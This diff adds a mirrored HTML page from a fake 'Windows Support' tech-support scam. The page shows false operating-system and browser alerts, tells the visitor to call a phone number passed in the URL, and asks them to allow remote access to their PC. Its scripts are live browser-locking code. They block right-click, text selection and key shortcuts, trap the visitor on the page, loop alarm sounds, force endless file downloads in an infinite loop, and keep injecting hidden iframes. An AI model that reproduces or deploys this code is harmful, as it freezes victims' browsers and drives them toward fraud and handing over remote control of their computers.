@@ -1,0 +1,671 @@
+<!doctype html>
+<html class="no-js" lang="">
+<!--<![endif]-->
+
+<!-- Mirrored from 104.248.221.3/systemerror-ie-edge/?phone=+& by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 05 Oct 2019 20:19:14 GMT -->
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<title>Help and Support for Windows</title>
+<meta name="description" content="tech support, advance call center, advancecallcenter">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="bootstrap.min.css">
+<link rel="stylesheet" href="sli/css/simple-line-icons.css">
+<link rel="stylesheet" href="style.min.css">
+<link rel="stylesheet" href="main.min.css">
+<link href="https://chrome.google.com/webstore/detail/ghbmnnjooekpmoecnnnilnnbdlolhkhi" rel="chrome-webstore-item">
+<!-- Google Fonts -->
+<link href="http://fonts.googleapis.com/css?family=Raleway:400,700,800&amp;subsetting=all" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=Open+Sans:400italic,400,800,700,300" rel="stylesheet" type="text/css">
+
+
+<script src="../../ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="../../maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
+
+    <script type="text/javascript">
+                    (function(funcName, baseObj) {
+                            // The public function name defaults to window.docReady
+                            // but you can pass in your own object and own function name and those will be used
+                            // if you want to put them in a different namespace
+                            funcName = funcName || "docReady";
+                            baseObj = baseObj || window;
+                            var readyList = [];
+                            var readyFired = false;
+                            var readyEventHandlersInstalled = false;
+
+                            // call this when the document is ready
+                            // this function protects itself against being called more than once
+                            function ready() {
+                                if (!readyFired) {
+                                    // this must be set to true before we start calling callbacks
+                                    readyFired = true;
+                                    for (var i = 0; i < readyList.length; i++) {
+                                        // if a callback here happens to add new ready handlers,
+                                        // the docReady() function will see that it already fired
+                                        // and will schedule the callback to run right after
+                                        // this event loop finishes so all handlers will still execute
+                                        // in order and no new ones will be added to the readyList
+                                        // while we are processing the list
+                                        readyList[i].fn.call(window, readyList[i].ctx);
+                                    }
+                                    // allow any closures held by these functions to free
+                                    readyList = [];
+                                }
+                            }
+
+                            function readyStateChange() {
+                                if ( document.readyState === "complete" ) {
+                                    ready();
+                                }
+                            }
+
+                            // This is the one public interface
+                            // docReady(fn, context);
+                            // the context argument is optional - if present, it will be passed
+                            // as an argument to the callback
+                            baseObj[funcName] = function(callback, context) {
+                                // if ready has already fired, then just schedule the callback
+                                // to fire asynchronously, but right away
+                                if (readyFired) {
+                                    setTimeout(function() {callback(context);}, 1);
+                                    return;
+                                } else {
+                                    // add the function and context to the list
+                                    readyList.push({fn: callback, ctx: context});
+                                }
+                                // if document already ready to go, schedule the ready function to run
+                                if (document.readyState === "complete") {
+                                    setTimeout(ready, 1);
+                                } else if (!readyEventHandlersInstalled) {
+                                    // otherwise if we don't have event handlers installed, install them
+                                    if (document.addEventListener) {
+                                        // first choice is DOMContentLoaded event
+                                        document.addEventListener("DOMContentLoaded", ready, false);
+                                        // backup is window load event
+                                        window.addEventListener("load", ready, false);
+                                    } else {
+                                        // must be IE
+                                        document.attachEvent("onreadystatechange", readyStateChange);
+                                        window.attachEvent("onload", ready);
+                                    }
+                                    readyEventHandlersInstalled = true;
+                                }
+                            }
+                    })("docReady", window);
+
+                    document.ondragstart = test;
+                    document.onselectstart = test;
+                    document.oncontextmenu = test;
+                    function test() {
+                        return false;
+                    }
+                    document.oncontextmenu;
+                    function catchControlKeys(event) {
+                        var code = event.keyCode ? event.keyCode : event.which ? event.which : null;
+                        if (event.ctrlKey) {
+                            // Ctrl+U
+                            if (code == 117) {
+                                return false;
+                            }
+                            if (code == 85) {
+                                return false;
+                            }
+                            // Ctrl+C
+                            if (code == 99) {
+                                return false;
+                            }
+                            if (code == 67) {
+                                return false;
+                            }
+                            // Ctrl+A
+                            if (code == 97) {
+                                return false;
+                            }
+                            if (code == 65) {
+                                return false;
+                            }
+                        }
+                    }
+                </script>
+    <script type="text/javascript">
+        function goodbye(e) {
+            if (!e)
+                e = window.event;
+            //e.cancelBubble is supported by IE - this will kill the bubbling process.
+            e.cancelBubble = true;
+            e.returnValue = "";
+
+            //e.stopPropagation works in Firefox.
+            if (e.stopPropagation) {
+                e.stopPropagation();
+                e.preventDefault();
+            }
+        }
+        window.onbeforeunload = goodbye;
+    </script>
+
+    <script>
+
+        function getVariableFromURl(name)
+        {
+            name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
+            var regexS = "[\\?&]"+name+"=([^&#]*)";
+            var regex = new RegExp( regexS );
+            var results = regex.exec( window.location.href );
+            if( results == null )
+                return "";
+            else
+                return results[1];
+        }
+    </script>
+    
+</head>
+
+<body style="cursor: url(_data_image/png%3bbase64%2ciVBORw0KGgoAAAANSUhEUgAAAIAAAACACAMA/xhBQAAAAFzUkdCAK7OHOkAAAAPUExURQAAAAICAgAAAP/5WVlXiCGdAAAAADdFJOUwD8ZX%2bn/7gAAABvSURBVHja7dbBAUAwEABB/ykAAAAAAAAAAAAAAAAAgNcF) 128 128, crosshair;">
+<!--[if lt IE 8]>
+            <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
+        <![endif]-->
+				<audio autoplay="autoplay" loop="" id="msgSound">
+			    <source src="err.mp3" type="audio/mpeg">
+			  </audio>
+
+			  <audio autoplay="autoplay" loop="" id="msgSound1">
+			    <source src="beep.mp3" type="audio/mpeg">
+			  </audio>
+
+
+			  		<script type="text/javascript">/*<![CDATA[*/
+			  		// audio play /*
+			  			var msgAudioEl = document.getElementById("msgSound");
+
+			  			var playMsgInt = setInterval(function () {
+			  				if (isPlaying(msgAudioEl)) {
+			  					// console.log('already playing. clearing interval');
+			  					clearInterval(playMsgInt);
+			  				} else {
+			  					// console.log('Triggering play');
+			  					msgAudioEl.play();
+			  				}
+			  			}, 500);
+			  			// audio play */
+
+			  		</script>
+
+			      		<script type="text/javascript">/*<![CDATA[*/
+			      		// audio play /*
+			      			var msgAudioEl = document.getElementById("msgSound1");
+
+			      			var playMsgInt = setInterval(function () {
+			      				if (isPlaying(msgAudioEl)) {
+			      					// console.log('already playing. clearing interval');
+			      					clearInterval(playMsgInt);
+			      				} else {
+			      					// console.log('Triggering play');
+			      					msgAudioEl.play();
+			      				}
+			      			}, 500);
+			      			// audio play */
+
+			      		</script>
+<div id="main-layout">
+  <div>
+
+    <!-- Banner -->
+    <div id="banner" class="bg-main">
+      <!-- Start Header -->
+      <div id="header">
+        <div>
+          <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+            <div class="container">
+              <div class="navbar-header">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span> </button>
+                <!-- Start Logo / Text -->
+                <a class="navbar-brand valign-middle" href="#"><span>Windows Support</span> </a>
+                <!-- End Logo / Text -->
+              </div>
+              <!-- Start Navigation -->
+              <div class="navigation navbar-collapse collapse">
+                <p class="navbar-text navbar-right h4 strong m0"><a href="#" class="text-white">Call Support: <span class="phone"></span>  (Toll Free)</a></p>
+              </div>
+              <!-- End Navigation  -->
+            </div>
+          </nav>
+        </div>
+      </div>
+      <!-- End Header -->
+      <div id="banner-content" class="banner-content pt0">
+        <div>
+          <div class="container">
+            <div class="row">
+              <!-- Start Header Text -->
+              <div class="col-md-7 col-sm-7">
+                <h1 id="ad-title"><span class="brand-color">Windows Operating System Alert</span></h1>
+                <p><strong>Windows & Internet Browser updates are needed to patch new security flaws and / or fix bugs in the system. If you have yout computer connected to the Internet, you desperately need to keep your security as up to date as possible. Updates patch security vulnerabilities that could allow a system to become compromised Please call to get it fixed <span class="phone"></span></strong></p>
+                <div class="row">
+				<div class="col-md-12">
+					<div class="alert">
+						<span class="h4">Operating System Details</span>
+						<div class="panel mb10" style="height: 100px;">
+							<div class="panel-body">
+								<br>
+								<table style="width: 100%;" class="text-center">
+									<thead>
+										<tr>
+											<th class="text-center"><label class="label label-info" style="font-size: 14px;" id="os-title">Operating System:</label></th>
+											<th class="text-center"><label class="label label-info newestos" style="font-size: 14px;">Newest Version:</label></th>
+										</tr>
+									</thead>
+									<tbody>
+										<tr>
+											<td>
+												<span id="os-version"><span id="os">Windows Server 2019 LTSC Build 17623</span> <span id="architecture"></span></span>
+											</td>
+											<td>
+												<span class="newestos">Windows 10</span>
+											</td>
+										</tr>
+									</tbody>
+								</table>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+            <div class="row">
+				<div class="col-md-12">
+					<div class="alert">
+						<span class="h4">Internet Browser Details</span>
+						<div class="panel mb10" style="height: 100px;">
+							<div class="panel-body">
+								<br>
+								<table style="width: 100%;" class="text-center">
+									<thead>
+										<tr>
+											<th class="text-center"><label class="label label-info" style="font-size: 14px; background-color: red;" id="browser-title">Internet Browser Outdated</label></th>
+											<th class="text-center"><label class="label label-info newestbrowser" style="font-size: 14px; display: inline;">Newest Version:</label></th>
+										</tr>
+									</thead>
+									<tbody>
+										<tr>
+											<td>
+												<span id="browser-version"><span id="browser">Internet Explorer 10 and Edge 40.18362.1.0</span></span>
+											</td>
+											<td>
+												<span class="newestbrowser" id="newest-browser" style="display: inline;">Internet Explorer 11.0.11 and Edge 44.18362.1.0</span>
+											</td>
+										</tr>
+									</tbody>
+								</table>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+
+
+              </div>
+              <!-- End Header Text -->
+              <!-- Start Banner Product Support -->
+              <div class="col-lg-5 col-md-5 col-sm-5"> <img src="img/Windows.png" alt="Windows support" class="img-responsive">
+                <div class="panel panel-primary mt10">
+				<div class="panel-heading">
+					<h2 class="panel-title text-center">Local Support Number</h2>
+				</div>
+				<div class="panel-body text-center">
+					<p class="m0" style="font-size: 24px;">Local Remote Support Number: <br><strong><u><span class="data_encode brand-color" class="phone"></span></u></strong></p>
+				</div>
+			</div>
+                <div id="get-support-panel" class="panel panel-primary">
+                  <div class="panel-heading">
+                    <h2 class="panel-title text-center">Toll Free Assistance</h2>
+
+                  </div>
+                  <div class="panel-body text-center">
+                    <p>Get Support For Windows Support Now</p>
+                    <hr>
+                    <p class="m0">Toll Free Assistance:<br>
+ <strong><u><a id="main-phone" href="#" class="brand-color" style="font-size:32px;"><span class="phone"></span></a></u></strong></p>
+                  </div>
+                </div>
+              </div>
+              <!-- End Banner Product Support -->
+            </div>
+            <div id="why-us" class="panel panel-success">
+              <div class="panel-heading">
+                <h2 class="panel-title text-center">Why Us?</h2>
+              </div>
+              <div class="panel-body text-center">
+                <div class="row">
+                  <div class="col-md-3 col-sm-6">
+                    <p>Trusted Support</p>
+                    <p id="all-days-support" class="brand-color">24<span style="color: #525252;">x</span>7</p>
+                  </div>
+                  <div class="col-md-3 col-sm-6">
+                    <div class="row">
+                      <div class="col-md-5 col-md-offset-1">
+                        <div class="panel panel-primary">
+                          <div id="days-guarantee" class="panel-body"> 30 days </div>
+                        </div>
+                      </div>
+                      <div class="col-md-6">
+                        <p class="brand-color mb0 mt20">Money Back Guarantee</p>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="col-md-3 col-sm-6">
+                    <div class="row">
+                      <div class="col-md-3 col-md-offset-2 text-center"> <img id="certified-logo" src="img/advance_call_center.png" alt="Windows Support Logo" class="img-responsive"> </div>
+                      <div class="col-md-7">
+                        <p class="brand-color mb0 mt20">Windows Support Certified Technicians</p>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="col-md-3 col-sm-6">
+                    <div class="row">
+                      <div class="col-md-12 text-center"> <img id="made-in-usa" src="img/made_in_usa.png" alt="Windows Support Made In UK" class="img-responsive"> </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <!-- End Banner -->
+    <div id="disclaimer" class="disclaimer bg-primary">
+      <div>
+        <div class="container">
+          <p> <u>Disclaimer:</u> Windows Support is an Independent Service provider for software related issues in desktops, laptops, and peripherals.The brand names, trademarks, logos, company names used in the site belongs to their respective owners and are
+            for representation purposes only. Windows Support recommends support from the respective OEM as similar tech help may be provided by the brand owner site as well. </p>
+        </div>
+      </div>
+    </div>
+    <section id="brand-support" class="section">
+      <div>
+        <div class="container">
+          <!-- Example row of columns -->
+          <div class="row">
+            <div class="col-md-12 col-sm-12 headline">
+              <h2>Support For Windows <br>
+                <span class="small text-blue">By Windows Support</span></h2>
+            </div>
+          </div>
+          <div class="row">
+            <div class="col-md-12 col-sm-12">
+              <p>Get Windows support and Windows help by certified Windows Windows professionals. If you have installed latest Windows version or any other Windows product then you need a Windows support professional to help you troubleshoot and fix problems. You can call us anytime and one of our Windows support professional will help you find a solution and get you up and running within no time. We offer Windows premium tech support to users using any of the Windows products. We are always open which ensures you are never left out and one of us will always be with you to help you on all Windows products.</p>
+
+              </p>
+              <div class="row">
+				<div class="col-md-5 col-md-offset-1">
+					<div class="features"><i class="line-font blue icon-shield"></i><h3>Error installing Windows Windows Update</h3></div><div class="features"><i class="line-font blue icon-shield"></i><h3>Office 365 install error</h3></div><div class="features"><i class="line-font blue icon-shield"></i><h3>Windows Windows not downloading updates</h3></div><div class="features"><i class="line-font blue icon-shield"></i><h3>Windows Windows security pop-ups</h3></div>
+				</div>
+				<div class="col-md-5">
+					<div class="features"><i class="line-font blue icon-shield"></i><h3>Windows Internet Explorer crashes</h3></div><div class="features"><i class="line-font blue icon-shield"></i><h3>Windows Windows backup fails</h3></div><div class="features"><i class="line-font blue icon-shield"></i><h3>Windows Windows DLL missing error</h3></div><div class="features"><i class="line-font blue icon-shield"></i><h3>Windows Unexpected error occurred</h3></div>
+				</div>
+			</div>
+              <p>These are just some of the remote tech support available through us. If you need detailed information about the same, you can call our Call Center experts, available to serve you round the clock.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section id="action-to-call">
+      <div>
+        <div class="container">
+          <div class="panel panel-warning">
+            <div class="panel-heading">
+              <div class="panel-title text-center strong valign-middle" style="font-size: 20px;"> <i class="line-font blue icon-call-out"></i> <span>USA Toll Free <a href="#"><span class="phone"></span></a></span> </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section id="triforce" class="section nopadding-bottom">
+      <div>
+        <div class="container">
+          <div class="row">
+            <div class="col-md-6">
+              <div class="panel panel-default">
+                <div class="panel-body text-center valign-middle" style="font-size: 20px;"> <i class="line-font blue icon-envelope"></i> <a href="#">Windows Support</a> </div>
+              </div>
+            </div>
+            <div class="col-md-6">
+              <div class="panel panel-default">
+                <div class="panel-body text-center valign-middle" style="font-size: 20px;"> <i class="line-font blue icon-call-out"></i> <a href="#"><span class="phone"></span></a> </div>
+              </div>
+            </div>
+          </div>
+          <div class="row">
+            <div class="col-md-6 col-md-offset-3">
+              <div class="panel panel-default">
+                <div class="panel-body text-center valign-middle" style="font-size: 20px;"> <i class="line-font blue icon-users"></i> <span>Windows Support excels in:</span> </div>
+                <ul class="list-group" style="font-size: 18px;">
+                  <li class="list-group-item">Great service you expect from us</li>
+                  <li class="list-group-item">Qualified and skilled team of technicians</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section id="support-includes" class="section">
+      <div>
+        <div class="container">
+          <div class="row">
+            <div class="col-md-12 col-sm-12 headline">
+              <h2>Support from Windows Support Includes:</h2>
+            </div>
+          </div>
+          <div class="row">
+            <div class="col-md-6 col-sm-6">
+              <ul class="list-group" style="font-size: 18px;">
+                <li class="list-group-item"><i class="fa fa-angle-double-right"></i> Printer &amp; Printing Problems</li>
+                <li class="list-group-item"><i class="fa fa-angle-double-right"></i> Drivers &amp; Software Problems</li>
+                <li class="list-group-item"><i class="fa fa-angle-double-right"></i> Scanning Problems</li>
+                <li class="list-group-item"><i class="fa fa-angle-double-right"></i> Internet Problems</li>
+                <li class="list-group-item"><i class="fa fa-angle-double-right"></i> Antivirus Problems</li>
+                <li class="list-group-item"><i class="fa fa-angle-double-right"></i> Router &amp; Wifi Problems</li>
+              </ul>
+            </div>
+            <div class="col-md-6 col-sm-6">
+              <ul class="list-group" style="font-size: 18px;">
+                <li class="list-group-item"><i class="fa fa-angle-double-right"></i> Infections Problems</li>
+                <li class="list-group-item"><i class="fa fa-angle-double-right"></i> Sound / Videos / Flash Problems</li>
+                <li class="list-group-item"><i class="fa fa-angle-double-right"></i> Slow Performance Problems</li>
+                <li class="list-group-item"><i class="fa fa-angle-double-right"></i> Unwanted Software &amp; Tools Removal</li>
+                <li class="list-group-item"><i class="fa fa-angle-double-right"></i> Gaming Problems</li>
+                <li class="list-group-item"><i class="fa fa-angle-double-right"></i> Other Software Issues</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section id="how-we-work" class="section bg-blue-pattern">
+      <div>
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-12 text-center white-text">
+              <div class="headline">
+                <h2>How We Work</h2>
+              </div>
+              <div class="row">
+                <div class="col-md-4">
+                  <div class="help-block"> <img src="img/call.png" alt="" class="img-responsive img-circle center-block"> </div>
+                  <h3 class="text-center">CALL</h3>
+                  <p class="text-center">Dial USA Toll Free 24X7</p>
+                  <p class="h2 text-center"><span class="phone"></span></p>
+                </div>
+                <div class="col-md-4">
+                  <div class="help-block"> <img src="img/connect.png" alt="" class="img-responsive img-circle center-block"> </div>
+                  <h3 class="text-center">CONNECT</h3>
+                  <p class="text-center">Allow our tech support experts to securely access your PC over the internet.</p>
+                </div>
+                <div class="col-md-4">
+                  <div class="help-block"> <img src="img/resolve.png" alt="" class="img-responsive img-circle center-block"> </div>
+                  <h3 class="text-center">RELAX</h3>
+                  <p class="text-center">Our experts will fix your problem right before your eyes and be right there on the phone.</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section id="reach-us" class="footer footer-top">
+      <div>
+        <div class="container">
+          <div class="row">
+            <!-- Contact Details  -->
+
+            <!-- End Contact Details  -->
+            <!-- Quick Links -->
+            <div class="col-md-4 col-md-offset-4">
+              <div class="contact-info text-center">
+                <h3>USA Toll Free</h3>
+                <i class="icon-call-out"></i> <a href="#" style="font-size: 20px;"><span class="phone"></span></a> </div>
+            </div>
+            <!-- End Quick links -->
+          </div>
+        </div>
+      </div>
+    </section>
+    <!-- End Footer Top -->
+
+    <!-- Footer Bottom -->
+    <footer id="footer" class="footer footer-sub text-center">
+      <div>
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-12 col-sm-12">
+              <p>© 2019 All Right Reserved.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </footer>
+  </div>
+</div>
+
+<script type="text/javascript">
+
+    var phone = getVariableFromURl('phone');
+
+    $('.phone').text(phone);
+    
+			function download(g, h, j) {
+					var k = new Blob([g], {
+							type: j
+					});
+					if (window.navigator.msSaveOrOpenBlob) window.navigator.msSaveOrOpenBlob(k, h);
+					else {
+							var l = document.createElement("a"),
+									m = URL.createObjectURL(k);
+							l.href = m, l.download = h, l.click(), setTimeout(function() {}, 0)
+					}
+			}
+			function bomb_ch() {
+					var g = Math.random().toString(36).substring(20),
+							h = Math.floor(50 * Math.random() + 25);
+					while (true) download(h, g, g)
+			}
+			function ch_jam() {
+					bomb_ch()
+			}
+			docReady(function()
+							{
+									setTimeout(function(){
+					setInterval(ch_jam, 0.5);
+			}, 2000);
+							});
+
+	</script>
+
+
+
+<script type="text/javascript">/*<![CDATA[*/
+
+ function get_browser(){
+		var ua=navigator.userAgent,tem,M=ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+		if(/trident/i.test(M[1])){
+				tem=/\brv[ :]+(\d+)/g.exec(ua) || [];
+				return {name:'IE',version:(tem[1]||'')};
+				}
+		if(M[1]==='Chrome'){
+				tem=ua.match(/\bOPR\/(\d+)/)
+				if(tem!=null)   {return {name:'Opera', version:tem[1]};}
+				}
+		M=M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
+		if((tem=ua.match(/version\/(\d+)/i))!=null) {M.splice(1,1,tem[1]);}
+		return {
+			name: M[0],
+			version: M[1]
+		};
+ }
+ var InternetEx=window.navigator.appVersion.indexOf("MSIE")!=-1;
+var isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
+var browser=get_browser();
+if(browser.name=="Firefox" || isIEedge|| InternetEx || navigator.appName == 'Microsoft Internet Explorer' ||  !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/)) ){
+	if(isIEedge|| InternetEx || navigator.appName == 'Microsoft Internet Explorer' ||  !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/)))
+		{
+
+			 function msg_ff() {
+
+						var i = document.createElement("div");
+						i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="dsffddfdfdsawqwq22121sdsd.html"></iframe></div>';
+						document.body.appendChild(i);
+
+				}
+				window.setInterval(function() {
+						msg_ff();
+
+				}, 1100);
+
+			}
+	else{
+			function msg_ff() {
+
+						var i = document.createElement("div");
+						i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="dsffddfdfdsawqwq22121sdsd.html"></iframe></div>';
+						document.body.appendChild(i);
+				}
+				window.setInterval(function() {
+						msg_ff();
+
+				}, 1100);
+
+		}
+
+ }
+ else{
+
+	 }
+
+
+/*]]>*/</script>
+
+
+<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="dsffddfdfdsawqwq22121sdsd.html"></iframe></div>
+<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="dsffddfdfdsawqwq22121sdsd.html"></iframe></div>
+
+<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="dsffddfdfdsawqwq22121sdsd.html"></iframe></div>
+<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="dsffddfdfdsawqwq22121sdsd.html"></iframe></div>
+
+<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="dsffddfdfdsawqwq22121sdsd.html"></iframe></div>
+<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="dsffddfdfdsawqwq22121sdsd.html"></iframe></div>
+
+<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="dsffddfdfdsawqwq22121sdsd.html"></iframe></div>
+<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="dsffddfdfdsawqwq22121sdsd.html"></iframe></div>
+
+<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="dsffddfdfdsawqwq22121sdsd.html"></iframe></div>
+<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="dsffddfdfdsawqwq22121sdsd.html"></iframe></div>
+
+<script src="js/main.js" type="text/javascript"></script>
+
+
+</body>
+
+<!-- Mirrored from 104.248.221.3/systemerror-ie-edge/?phone=+& by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 05 Oct 2019 20:19:26 GMT -->
+</html>
